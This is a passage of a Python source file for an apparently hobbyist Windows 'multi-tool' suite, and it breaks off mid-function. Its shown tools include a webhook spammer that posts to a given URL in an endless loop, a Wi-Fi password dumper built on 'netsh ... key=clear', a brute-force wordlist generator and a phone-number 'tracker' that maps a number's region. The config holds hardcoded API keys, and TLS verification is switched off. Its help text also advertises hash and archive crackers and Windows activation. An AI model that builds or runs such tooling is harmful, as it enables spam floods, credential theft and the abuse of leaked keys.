import hashlib
import itertools
import os
import platform
import random
import re
import shutil
import socket
import string
import subprocess
import threading
import time
import webbrowser
import logging
import configparser
from datetime import datetime
from threading import Thread
from time import sleep
from tkinter import *
from tkinter import messagebox
from zipfile import ZipFile, is_zipfile
import cloudscraper
import folium
import ipinfo
import phonenumbers
import psutil
import pywifi
import pyzipper
import requests
import sys
from colorama import Fore
from opencage.geocoder import OpenCageGeocode
from phonenumbers import geocoder, timezone, carrier
from pywifi import const
from pytools.proxy_scraper import SCRAPER
from pytools.pythonic_way_proxy_checker import HttpProxyChecker, Socks4ProxyChecker, Socks5ProxyChecker
from urllib.parse import urlparse
from colorama import Fore, init
from bs4 import BeautifulSoup
import patoolib
from pathlib import Path
import urllib3
import ssl

# Disable SSL warnings for better user experience
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enhanced configuration and logging setup
class ConfigManager:
    def __init__(self):
        self.config_file = "apkaless_config.ini"
        self.config = configparser.ConfigParser()
        self.load_config()
    
    def load_config(self):
        if os.path.exists(self.config_file):
            self.config.read(self.config_file)
        else:
            self.create_default_config()
    
    def create_default_config(self):
        self.config['DEFAULT'] = {
            'log_level': 'INFO',
            'auto_update': 'True',
            'save_logs': 'True',
            'max_threads': '50',
            'timeout': '30'
        }
        self.config['API_KEYS'] = {
            'opencage_key': '42c84373c47e490ba410d4132ae64fc4',
            'ipinfo_key': '58950d8a1c1383'
        }
        self.save_config()
    
    def save_config(self):
        with open(self.config_file, 'w') as f:
            self.config.write(f)
    
    def get(self, section, key, fallback=None):
        return self.config.get(section, key, fallback=fallback)
    
    def set(self, section, key, value):
        if not self.config.has_section(section):
            self.config.add_section(section)
        self.config.set(section, key, str(value))
        self.save_config()

class Logger:
    def __init__(self, name="LOGGER"):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        
        if not self.logger.handlers:
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            
            # Console handler
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(formatter)
            self.logger.addHandler(console_handler)
            
            # File handler
            if config_manager.get('DEFAULT', 'save_logs', fallback='True').lower() == 'true':
                file_handler = logging.FileHandler('log.log')
                file_handler.setFormatter(formatter)
                self.logger.addHandler(file_handler)
    
    def info(self, message):
        self.logger.info(message)
    
    def error(self, message):
        self.logger.error(message)
    
    def warning(self, message):
        self.logger.warning(message)
    
    def debug(self, message):
        self.logger.debug(message)

class SecurityManager:
    @staticmethod
    def validate_input(input_str, max_length=100):
        """Validate user input to prevent injection attacks"""
        if not input_str or len(input_str) > max_length:
            return False
        # Basic sanitization
        dangerous_chars = ['<', '>', '"', "'", '&', ';', '|', '`', '$']
        return not any(char in input_str for char in dangerous_chars)
    
    @staticmethod
    def safe_path(path):
        """Ensure path is safe and doesn't contain directory traversal"""
        normalized = os.path.normpath(path)
        return not normalized.startswith('..') and not normalized.startswith('/')

class NetworkManager:
    @staticmethod
    def check_internet_connection():
        """Check internet connectivity with multiple fallback URLs"""
        urls = [
            'https://www.google.com',
            'https://www.cloudflare.com',
            'https://www.github.com'
        ]
        
        for url in urls:
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    return True
            except:
                continue
        return False
    
    @staticmethod
    def get_public_ip():
        """Get public IP with multiple fallback services"""
        services = [
            'https://api.ipify.org',
            'https://ifconfig.me/ip',
            'https://icanhazip.com'
        ]
        
        for service in services:
            try:
                response = requests.get(service, timeout=10, verify=False)
                if response.status_code == 200:
                    return response.text.strip()
            except:
                continue
        return "Unknown"

# Initialize managers
config_manager = ConfigManager()
logger = Logger()
security_manager = SecurityManager()
network_manager = NetworkManager()


def show_settings_menu():
    """Display and manage application settings"""
    os.system('cls')
    
    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
    print(f'{cyan}║                              SETTINGS & CONFIGURATION                        ║')
    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
    
    try:
        while True:
            print(f'{cyan}Available Settings:{rescolor}')
            print(f'{white}[1] View current configuration')
            print(f'{white}[2] Change log level')
            print(f'{white}[3] Toggle auto-update')
            print(f'{white}[4] Toggle log saving')
            print(f'{white}[5] Change API keys')
            print(f'{white}[0] Back to main menu')
            
            choice = input(f'\n{green}[+] Select option:{white} ').strip()
            
            if choice == '0':
                break
            elif choice == '1':
                print(f'\n{green}Current Configuration:{rescolor}')
                for section in config_manager.config.sections():
                    print(f'\n{cyan}{section}:{rescolor}')
                    for key, value in config_manager.config.items(section):
                        print(f'{white}  {key}: {value}{rescolor}')
                input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                
            elif choice == '2':
                levels = ['DEBUG', 'INFO', 'WARNING', 'ERROR']
                print(f'\n{cyan}Available log levels: {", ".join(levels)}{rescolor}')
                new_level = input(f'{green}[+] Enter new log level:{white} ').strip().upper()
                if new_level in levels:
                    config_manager.set('DEFAULT', 'log_level', new_level)
                    print(f'{green}[+] Log level updated to: {new_level}{rescolor}')
                else:
                    print(f'{red}[-] Invalid log level{rescolor}')
                input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                
            elif choice == '3':
                current = config_manager.get('DEFAULT', 'auto_update', 'True')
                new_value = 'False' if current.lower() == 'true' else 'True'
                config_manager.set('DEFAULT', 'auto_update', new_value)
                print(f'{green}[+] Auto-update set to: {new_value}{rescolor}')
                input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                
            elif choice == '4':
                current = config_manager.get('DEFAULT', 'save_logs', 'True')
                new_value = 'False' if current.lower() == 'true' else 'True'
                config_manager.set('DEFAULT', 'save_logs', new_value)
                print(f'{green}[+] Log saving set to: {new_value}{rescolor}')
                input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                
            elif choice == '5':
                print(f'\n{cyan}API Keys:{rescolor}')
                opencage_key = input(f'{green}[+] OpenCage API Key (press Enter to skip):{white} ').strip()
                if opencage_key:
                    config_manager.set('API_KEYS', 'opencage_key', opencage_key)
                    print(f'{green}[+] OpenCage API key updated{rescolor}')
                
                ipinfo_key = input(f'{green}[+] IPInfo API Key (press Enter to skip):{white} ').strip()
                if ipinfo_key:
                    config_manager.set('API_KEYS', 'ipinfo_key', ipinfo_key)
                    print(f'{green}[+] IPInfo API key updated{rescolor}')
                
                input(f'\n{blue}[!] Press Enter to continue...{rescolor}')
                
            else:
                print(f'{red}[-] Invalid option{rescolor}')
                time.sleep(1)
            
            os.system('cls')
            print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║                              SETTINGS & CONFIGURATION                        ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
            
    except Exception as e:
        logger.error(f"Settings menu error: {e}")
        print(f'{red}[-] Error in settings menu: {e}{rescolor}')
        input(f'\n{blue}[!] Press Enter to continue...{rescolor}')

def system_monitor():
    """Real-time system monitoring dashboard"""
    os.system('cls')
    
    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
    print(f'{cyan}║                              SYSTEM MONITOR                                  ║')
    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
    
    try:
        print(f'{yellow}[!] Press Ctrl+C to stop monitoring{rescolor}\n')
        
        while True:
            try:
                # CPU Information
                cpu_percent = psutil.cpu_percent(interval=1)
                cpu_count = psutil.cpu_count()
                cpu_freq = psutil.cpu_freq()
                
                # Memory Information
                memory = psutil.virtual_memory()
                memory_percent = memory.percent
                memory_used = memory.used / (1024**3)
                memory_total = memory.total / (1024**3)
                
                # Disk Information
                disk = psutil.disk_usage('/')
                disk_percent = disk.percent
                disk_used = disk.used / (1024**3)
                disk_total = disk.total / (1024**3)
                
                # Network Information
                network = psutil.net_io_counters()
                bytes_sent = network.bytes_sent / (1024**2)
                bytes_recv = network.bytes_recv / (1024**2)
                
                # Clear screen and display updated info
                os.system('cls')
                print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
                print(f'{cyan}║                              SYSTEM MONITOR                                  ║')
                print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
                
                current_time = datetime.now().strftime('%H:%M:%S')
                print(f'{lcyan}Last Updated: {current_time}{rescolor}\n')
                
                # CPU Status
                print(f'{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
                print(f'{green}[+] CPU Status:{rescolor}')
                print(f'{white}   Usage: {cpu_percent:>6.1f}%  Cores: {cpu_count:>2}  Frequency: {cpu_freq.current/1000:>6.1f} GHz{rescolor}')
                
                # Memory Status
                print(f'\n{green}[+] Memory Status:{rescolor}')
                print(f'{white}   Usage: {memory_percent:>6.1f}%  Used: {memory_used:>6.1f} GB  Total: {memory_total:>6.1f} GB{rescolor}')
                
                # Disk Status
                print(f'\n{green}[+] Disk Status:{rescolor}')
                print(f'{white}   Usage: {disk_percent:>6.1f}%  Used: {disk_used:>6.1f} GB  Total: {disk_total:>6.1f} GB{rescolor}')
                
                # Network Status
                print(f'\n{green}[+] Network Status:{rescolor}')
                print(f'{white}   Sent: {bytes_sent:>6.1f} MB  Received: {bytes_recv:>6.1f} MB{rescolor}')
                
                print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
                
                time.sleep(2)
                
            except KeyboardInterrupt:
                print(f'\n{cyan}[!] Monitoring stopped{rescolor}')
                break
            except Exception as e:
                logger.error(f"System monitoring error: {e}")
                print(f'{red}[-] Error in system monitoring: {e}{rescolor}')
                break
                
    except Exception as e:
        logger.error(f"System monitor error: {e}")
        print(f'{red}[-] Error starting system monitor: {e}{rescolor}')
    
    input(f'\n{blue}[!] Press Enter to continue...{rescolor}')

def show_about_help():
    """Display application information and help"""
    os.system('cls')
    
    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
    print(f'{cyan}║                              ABOUT & HELP                                   ║')
    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
    
    try:
        print(f'{green}Apkaless Multi-Tool Suite{rescolor}')
        print(f'{white}Version: {cversion}{rescolor}')
        print(f'{white}Developer: Apkaless{rescolor}')
        print(f'{white}Region: IRAQ{rescolor}\n')
        
        print(f'{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{cyan}Available Tools:{rescolor}')
        print(f'{white}• System Tools: IDM Reset, Temp Cleaner, Windows Activation, Network Optimizer{rescolor}')
        print(f'{white}• Security Tools: Hash Cracker, 7z/ZIP Cracker, WiFi Tools, Wordlist Generator{rescolor}')
        print(f'{white}• Network Tools: Discord Tools, Webhook Spammer, URL Masking, IP Lookup{rescolor}')
        print(f'{white}• Advanced Tools: Phone Tracker, System Info, Enhanced Python to EXE Converter{rescolor}')
        
        print(f'\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{cyan}Python to EXE Features:{rescolor}')
        print(f'{white}• Single file or directory mode{rescolor}')
        print(f'{white}• Console visibility control{rescolor}')
        print(f'{white}• UAC admin privileges option{rescolor}')
        print(f'{white}• Custom icon support{rescolor}')
        print(f'{white}• Size vs. speed optimization{rescolor}')
        print(f'{white}• Automatic dependency management{rescolor}')
        
        print(f'\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{cyan}Quick Tips:{rescolor}')
        print(f'{white}• Use number keys (01-28) to navigate the menu{rescolor}')
        print(f'{white}• Type 00 to exit the application{rescolor}')
        print(f'{white}• Check the settings menu (option 26) to customize the application{rescolor}')
        print(f'{white}• Use the system monitor (option 27) to track system performance{rescolor}')
        
        print(f'\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{cyan}Support & Links:{rescolor}')
        print(f'{white}• GitHub: https://github.com/apkaless{rescolor}')
        print(f'{white}• Instagram: @apkaless{rescolor}')
        print(f'{white}• For issues, check the logs or contact the developer{rescolor}')
        
        print(f'\n{cyan}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{yellow}⚠️  Disclaimer:{rescolor}')
        print(f'{white}This tool is for educational and authorized testing purposes only.{rescolor}')
        print(f'{white}Users are responsible for ensuring compliance with local laws and regulations.{rescolor}')
        
    except Exception as e:
        logger.error(f"About & Help error: {e}")
        print(f'{red}[-] Error displaying about & help: {e}{rescolor}')
    
    input(f'\n{blue}[!] Press Enter to continue...{rescolor}')

def enhanced_check_update():
    """Enhanced update checker with better error handling and user feedback"""
    try:
        if config_manager.get('DEFAULT', 'auto_update', fallback='True').lower() != 'true':
            logger.info("Auto-update is disabled in configuration")
            return
            
        logger.info("Checking for updates...")
        with cloudscraper.create_scraper(ssl_context=ssl.create_default_context()) as s:
            response = s.get('https://raw.githubusercontent.com/Apkaless/Apkaless/main/ver', 
                           timeout=10, verify=False)
            response.raise_for_status()
            res = int(response.text.strip())
            
            if res != cversion:
                logger.info(f"Update available: Current version {cversion}, Latest version {res}")
                msg = messagebox.askyesno('Update Available', 
                                        f'Version {res} is available!\nCurrent version: {cversion}\n\nWould you like to visit the update page?')
                if msg:
                    webbrowser.open('https://github.com/Apkaless/Apkaless/tree/main')
            else:
                logger.info("Application is up to date")
                
    except requests.exceptions.RequestException as e:
        logger.warning(f"Failed to check for updates: {e}")
    except ValueError as e:
        logger.error(f"Invalid version format received: {e}")
    except Exception as e:
        logger.error(f"Unexpected error during update check: {e}")

def enhanced_phoneNumberTracker(phoneNumber):
    """Enhanced phone number tracker with better error handling and validation"""
    if not security_manager.validate_input(phoneNumber, 20):
        print(f'{red}[-] Invalid phone number format')
        return
        
    os.system('cls')
    os.chdir(tool_parent_dir)
    
    try:
        phone_number_parsed = phonenumbers.parse(phoneNumber)
        
        if not phonenumbers.is_valid_number(phone_number_parsed):
            print(f'{red}[-] Invalid phone number')
            return

        print(f'{green}[+] Attempting to track location of:{white} {phonenumbers.format_number(phone_number_parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}...')

        # Get timezone information
        timezones = timezone.time_zones_for_number(phone_number_parsed)
        if timezones:
            print(f'{green}[+] Time Zone ID:{white} {", ".join(timezones)}')

        # Get location information
        location = geocoder.description_for_number(phone_number_parsed, 'en')
        if location:
            print(f'{green}[+] Region:{white} {location}')
        else:
            print(f'{green}[+] Region:{white} Unknown')

        # Get carrier information
        carrier_name = carrier.name_for_number(phone_number_parsed, 'en')
        if carrier_name:
            print(f'{green}[+] Service Provider:{white} {carrier_name}')
        else:
            print(f'{red}[-] Service Provider: Unknown')

        # Enhanced geocoding with error handling
        try:
            opencage_key = config_manager.get('API_KEYS', 'opencage_key')
            coder = OpenCageGeocode(opencage_key)
            results = coder.geocode(location)
            
            if results and len(results) > 0:
                lat = results[0]['geometry']['lat']
                lng = results[0]['geometry']['lng']
                
                # Get additional information if available
                currency_info = "Unknown"
                currency_symbol = "Unknown"
                if len(results) > 2 and 'annotations' in results[2]:
                    annotations = results[2]['annotations']
                    if 'currency' in annotations:
                        currency_info = annotations['currency'].get('name', 'Unknown')
                        currency_symbol = annotations['currency'].get('symbol', 'Unknown')

                print(f'{green}[+] Lat:{white} {lat}')
                print(f'{green}[+] Long:{white} {lng}')
                print(f'{green}[+] Currency:{white} {currency_info}')
                print(f'{green}[+] Currency Symbol:{white} {currency_symbol}')
                
                # Get address information
                try:
                    address = coder.reverse_geocode(lat, lng)
                    if address:
                        print(f'{green}[+] Approximate Location is:{white} {address[0]["formatted"]}')
                    else:
                        print(f'{red}[-] No Address Found For The Given Coordinates.')
                except Exception as e:
                    logger.warning(f"Could not get address information: {e}")

                # Create enhanced map
                my_map = folium.Map(location=[lat, lng], zoom_start=9)
                folium.Marker([lat, lng], popup=location).add_to(my_map)
                
                # Add additional map features
                folium.CircleMarker(
                    location=[lat, lng],
                    radius=50,
                    popup=f'Phone: {phoneNumber}',
                    color='red',
                    fill=True
                ).add_to(my_map)

                # Generate safe filename
                safe_filename = re.sub(r'[<>:"/\\|?*]', '_', phoneNumber)
                file_name = f"{safe_filename}_location.html"
                my_map.save(file_name)
                
                print(f"{green}[+] See Aerial Coverage at:{white} {os.path.abspath(file_name)}")
                
                # Open map in browser
                try:
                    webbrowser.open(f'file://{os.path.abspath(file_name)}')
                except:
                    pass
                    
            else:
                print(f'{red}[-] Could not retrieve location data')
                
        except Exception as e:
            logger.error(f"Geocoding error: {e}")
            print(f'{red}[-] Error retrieving location data')

    except phonenumbers.NumberParseException as e:
        print(f'{red}[-] Invalid phone number format: {e}')
    except Exception as e:
        logger.error(f"Phone number tracking error: {e}")
        print(f'{red}[-] An error occurred while tracking the phone number')

def enhanced_webhookSpammer():
    """Enhanced webhook spammer with rate limiting and better error handling"""
    os.system('cls')
    
    try:
        print(f'{red}[*] Note: {white}if you wanna stop the attack just press {blue}(ctrl + C){rescolor}\n')
        print(f'{yellow}[!] Warning: This tool is for educational purposes only. Use responsibly.\n')

        url = input(f'\n{green}[+] WebHook URL:{white} ')
        if not security_manager.validate_input(url):
            print(f'{red}[-] Invalid URL format')
            return

        content = input(f'\n{green}[+] {white}What Would You Like To Send {blue}(ex: Hello):{white} ')
        if not security_manager.validate_input(content):
            print(f'{red}[-] Invalid content')
            return

        username = input(f'\n{green}[+] Type Any Name:{white} ')
        if not security_manager.validate_input(username):
            print(f'{red}[-] Invalid username')
            return

        # Rate limiting options
        delay_options = {
            '1': 0.05,
            '2': 0.1,
            '3': 0.5,
            '4': 1.0
        }
        
        print(f'\n{cyan}Select delay between requests:')
        print(f'{white}[1] Fast (50ms)')
        print(f'{white}[2] Normal (100ms)')
        print(f'{white}[3] Slow (500ms)')
        print(f'{white}[4] Very Slow (1s)')
        
        delay_choice = input(f'{green}[+] Select delay (1-4):{white} ')
        delay = delay_options.get(delay_choice, 0.05)

        data = {
            'content': content,
            'username': username
        }

        os.system('cls')
        
        success_count = 0
        error_count = 0
        start_time = time.time()

        while True:
            try:
                res = requests.post(url, json=data, timeout=10)
                
                if res.status_code == 200:
                    success_count += 1
                    elapsed = time.time() - start_time
                    print(f"{green}[+] Payload delivered successfully, code {res.status_code}. "
                          f"Success: {success_count}, Errors: {error_count}, "
                          f"Elapsed: {elapsed:.1f}s")
                else:
                    error_count += 1
                    print(f"{yellow}[!] HTTP {res.status_code}: {res.text[:100]}")

            except requests.exceptions.HTTPError as e:
                error_count += 1
                print(f'{red}[-] HTTP Error {e.response.status_code}: {e.response.text[:100]}')
                if e.response.status_code == 429:  # Rate limited
                    print(f'{yellow}[!] Rate limited. Waiting 30 seconds...')
                    time.sleep(30)
                elif e.response.status_code >= 500:
                    print(f'{yellow}[!] Server error. Waiting 10 seconds...')
                    time.sleep(10)
                    
            except requests.exceptions.RequestException as e:
                error_count += 1
                print(f'{red}[-] Network error: {e}')
                print(f'{green}[+] Waiting to retry...')
                time.sleep(10)
                
            except KeyboardInterrupt:
                print(f'\n{cyan}[!] Stopping webhook spammer...')
                print(f'{green}[+] Final Stats - Success: {success_count}, Errors: {error_count}')
                break
                
            time.sleep(delay)

    except KeyboardInterrupt:
        print(f'\n{cyan}[!] Returning to main menu...')
    except Exception as e:
        logger.error(f"Webhook spammer error: {e}")
        print(f'{red}[-] An unexpected error occurred')
        time.sleep(3)

def enhanced_wifiPassword():
    """Enhanced WiFi password retrieval with better error handling"""
    os.system('cls')
    
    try:
        all_ssid = []
        
        # Use subprocess with better error handling
        try:
            res = subprocess.check_output('netsh wlan show profile', 
                                        shell=True, stderr=subprocess.PIPE, 
                                        timeout=30).decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            print(f'{red}[-] Command timed out. Please try again.')
            return
        except subprocess.CalledProcessError as e:
            print(f'{red}[-] Error executing command: {e}')
            return

        users = res.splitlines()
        
        for profile in users:
            if 'All User Profile' in profile:
                try:
                    ssid = profile.strip().split(':')[1].strip()
                    all_ssid.append(ssid)
                except IndexError:
                    continue

        if not all_ssid:
            print(f'{yellow}[!] No WiFi profiles found')
            return

        print(f'{green}[+] Found {len(all_ssid)} WiFi profiles\n')
        
        for i, ssid in enumerate(all_ssid, 1):
            try:
                print(f'{cyan}[{i}] {white}Retrieving password for: {ssid}')
                
                res = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', 
                                            shell=True, stderr=subprocess.PIPE, 
                                            timeout=30).decode('utf-8', errors='ignore')
                
                data = res.strip().splitlines()
                password_found = False
                
                for key in data:
                    if 'Key Content' in key:
                        try:
                            password = key.strip().split(':')[1].strip()
                            if password:
                                print(f'{green}[+] SSID:{white} {ssid}')
                                print(f'{green}[+] Password:{white} {password}')
                                print('-' * 50)
                                password_found = True
                                break
                        except IndexError:
                            continue
                
                if not password_found:
                    print(f'{yellow}[!] No password found for {ssid}')
                    
            except subprocess.TimeoutExpired:
                print(f'{red}[-] Timeout while retrieving password for {ssid}')
                continue
            except subprocess.CalledProcessError as e:
                print(f'{red}[-] Error retrieving password for {ssid}: {e}')
                continue
            except Exception as e:
                logger.error(f"Error processing WiFi profile {ssid}: {e}")
                continue
                
    except Exception as e:
        logger.error(f"WiFi password retrieval error: {e}")
        print(f'{red}[-] An unexpected error occurred')

def nmapCommands():
    """Display common Nmap commands and usage tips"""
    os.system('cls')
    print(f'''{cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                              NMAP COMMANDS GUIDE                             ║
╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}

{green}[+] Basic Network Discovery:{white}
    • nmap -sn 192.168.1.0/24          # Ping scan (host discovery)
    • nmap -PR 192.168.1.0/24          # ARP ping scan
    • nmap -PE 192.168.1.0/24          # ICMP echo scan

{green}[+] Port Scanning:{white}
    • nmap -p 80,443,22,21 192.168.1.1 # Specific ports
    • nmap -p- 192.168.1.1              # All ports (1-65535)
    • nmap -F 192.168.1.1               # Fast scan (top 100 ports)
    • nmap -sS 192.168.1.1              # SYN scan (stealth)
    • nmap -sT 192.168.1.1              # TCP connect scan
    • nmap -sU 192.168.1.1              # UDP scan

{green}[+] Service Detection:{white}
    • nmap -sV 192.168.1.1              # Version detection
    • nmap -sC 192.168.1.1              # Default script scan
    • nmap -A 192.168.1.1               # Aggressive scan (all above)

{green}[+] Output Formats:{white}
    • nmap -oN output.txt 192.168.1.1   # Normal output
    • nmap -oX output.xml 192.168.1.1   # XML output
    • nmap -oG output.gnmap 192.168.1.1 # Grepable output

{green}[+] Advanced Techniques:{white}
    • nmap --script=vuln 192.168.1.1    # Vulnerability scripts
    • nmap --script=auth 192.168.1.1    # Authentication scripts
    • nmap --script=brute 192.168.1.1   # Brute force scripts
    • nmap -T4 192.168.1.1              # Timing template (0-5)

{green}[+] Tips:{white}
    • Use -v for verbose output
    • Combine multiple options: nmap -sS -sV -O -p- 192.168.1.1
    • Always ensure you have permission to scan target networks
    • Some networks may block or detect aggressive scanning

{cyan}[!] Remember: Always use Nmap responsibly and only on networks you own or have permission to test.{rescolor}
''')

def enhanced_wordlist():
    """Enhanced wordlist generator with progress tracking and better memory management"""
    os.system('cls')
    os.chdir(tool_parent_dir)
    
    try:
        min_len = int(input(f'\n{green}[+] Min Length:{rescolor} '))
        max_len = int(input(f'\n{green}[+] Max Length:{rescolor} '))
        
        if min_len < 1 or max_len < min_len or max_len > 20:
            print(f'{red}[-] Invalid length range. Min: 1-20, Max: Min-20')
            return
            
        passwords_chars = input(f'\n{green}[+] What are the chars you want (ex: abc1234):{rescolor} ')
        if not security_manager.validate_input(passwords_chars, 100):
            print(f'{red}[-] Invalid characters')
            return
            
        filename = input(f'\n{green}[+] Type The Filename:{rescolor} ')
        if not security_manager.validate_input(filename, 50):
            print(f'{red}[-] Invalid filename')
            return

        # Calculate total combinations
        total_combinations = sum(len(passwords_chars) ** i for i in range(min_len, max_len + 1))
        print(f'{cyan}[!] Total combinations to generate: {total_combinations:,}')
        
        if total_combinations > 10000000:  # 10 million
            confirm = input(f'{yellow}[!] This will generate a very large file. Continue? (y/n): ')
            if confirm.lower() != 'y':
                return

        try:
            os.makedirs('wordlist', exist_ok=True)
        except:
            pass

        os.chdir('wordlist')
        
        output_file = filename + '.txt'
        gen_password = []
        start_time = time.time()
        
        with open(output_file, 'w', encoding='utf-8') as f:
            print(f'{yellow}\n[!] Press {white}ctrl + c {yellow}To Stop Generator !')
            print(f'{cyan}[!] Generating passwords...')
            
            try:
                for plen in range(min_len, max_len + 1):
                    print(f'{green}[+] Generating {plen}-character passwords...')
                    
                    passwords = itertools.product(passwords_chars, repeat=plen)
                    batch_size = 10000
                    batch = []
                    
                    for password in passwords:
                        full_password = ''.join(password)
                        batch.append(full_password)
                        gen_password.append(full_password)
                        
                        if len(batch) >= batch_size:
                            f.writelines(p + '\n' for p in batch)
                            f.flush()  # Ensure data is written
                            batch.clear()
                            
                            # Progress update
                            elapsed = time.time() - start_time
                            rate = len(gen_password) / elapsed if elapsed > 0 else 0
                            print(f'\r{cyan}[!] Generated: {len(gen_password):,} passwords, '
                                  f'Rate: {rate:.0f} pwd/s, Elapsed: {elapsed:.1f}s', end='')
                    
                    # Write remaining batch
                    if batch:
                        f.writelines(p + '\n' for p in batch)
                        
            except KeyboardInterrupt:
                print(f'\n{yellow}[!] Generation stopped by user')
            except Exception as e:
                logger.error(f"Wordlist generation error: {e}")
                print(f'{red}[-] Error during generation: {e}')
            finally:
                wordlistpath = os.path.abspath(output_file)
                os.system('cls')
                os.chdir(tool_parent_dir)
                
                elapsed = time.time() - start_time
                print(f'''{blue}

|===============|          
|     status    |
|===============|

{green}[+] Min Length:{white} {min_len}
{green}[+] Max Length:{white} {max_len}
{green}[+] Chars Selected:{white} {passwords_chars}
{green}[+] Words Generated:{white} {len(gen_password):,}
{green}[+] File Size:{white} {os.path.getsize(wordlistpath) / (1024*1024):.2f} MB
{green}[+] Generation Time:{white} {elapsed:.1f} seconds
{green}[+] Wordlist Path:{white} {wordlistpath}
''')
                
    except ValueError:
        print(f'{red}[-] Invalid input. Please enter valid numbers.')
    except Exception as e:
        logger.error(f"Wordlist error: {e}")
        print(f'{red}[-] An unexpected error occurred')

def enhanced_sysinfo():
    """Enhanced system information with detailed hardware and network details"""
    os.system('cls')
    
    try:
        print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
        print(f'{cyan}║                              SYSTEM INFORMATION                              ║')
        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
        
        # Basic system info
        print(f'{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{green}[+] Operating System:{white} {platform.system()} {platform.release()} ({platform.architecture()[0]})')
        print(f'{green}[+] Python Version:{white} {platform.python_version()}')
        print(f'{green}[+] Hostname:{white} {socket.gethostname()}')
        print(f'{green}[+] Username:{white} {os.getlogin()}')
        
        # CPU Information
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{green}[+] CPU Information:{rescolor}')
        try:
            cpu_count = psutil.cpu_count()
            cpu_count_logical = psutil.cpu_count(logical=True)
            cpu_percent = psutil.cpu_percent(interval=1)
            print(f'{white}   Cores: {cpu_count} physical, {cpu_count_logical} logical')
            print(f'{white}   Current Usage: {cpu_percent:.1f}%')
            
                # Try to get CPU name using PowerShell on Windows
            if platform.system() == "Windows":
                try:
                    import subprocess
                    cpu_name = subprocess.check_output(['powershell', 'Get-WmiObject', '-Class', 'Win32_Processor', '-Property', 'Name'], 
                                                    capture_output=True, text=True, timeout=5)
                    if cpu_name.stdout:
                        lines = cpu_name.stdout.strip().split('\n')
                        for line in lines:
                            if 'Name' in line and '=' in line:
                                name = line.split('=')[1].strip()
                                if name and name != 'Name':
                                    print(f'{white}   Model: {name}')
                                    break
                except:
                    pass
        except:
            print(f'{white}   Could not retrieve detailed CPU information')
        
        # Memory Information
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{green}[+] Memory Information:{rescolor}')
        try:
            memory = psutil.virtual_memory()
            print(f'{white}   Total: {memory.total / (1024**3):.2f} GB')
            print(f'{white}   Available: {memory.available / (1024**3):.2f} GB')
            print(f'{white}   Used: {memory.used / (1024**3):.2f} GB ({memory.percent:.1f}%)')
            
            # Memory modules (using psutil instead of wmic)
            try:
                # Get memory frequency if available
                if hasattr(psutil, 'sensors_temperatures'):
                    # Try to get memory info from system
                    print(f'{white}   Memory frequency: Using psutil (detailed module info not available)')
            except:
                pass
        except:
            print(f'{white}   Could not retrieve memory information')
        
        # Disk Information
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{green}[+] Disk Information:{rescolor}')
        try:
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    print(f'{white}   {partition.device}: {usage.total / (1024**3):.2f} GB total, '
                          f'{usage.free / (1024**3):.2f} GB free ({usage.percent:.1f}% used)')
                except:
                    continue
        except:
            print(f'{white}   Could not retrieve disk information')
        
        # Network Information
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{green}[+] Network Information:{rescolor}')
        try:
            # Local IP addresses
            for interface, addresses in psutil.net_if_addrs().items():
                for addr in addresses:
                    if addr.family == socket.AF_INET:
                        print(f'{white}   {interface}: {addr.address}')
            
            # Public IP
            try:
                public_ip = network_manager.get_public_ip()
                print(f'{white}   Public IP: {public_ip}')
            except:
                print(f'{white}   Public IP: Could not retrieve')
        except:
            print(f'{white}   Could not retrieve network information')
        
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        
    except Exception as e:
        logger.error(f"System info error: {e}")
        print(f'{red}[-] Error retrieving system information: {e}')

def enhanced_public_ip():
    """Enhanced public IP lookup with detailed information and map"""
    os.system('cls')
    
    try:
        print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
        print(f'{cyan}║                           ENHANCED PUBLIC IP LOOKUP                        ║')
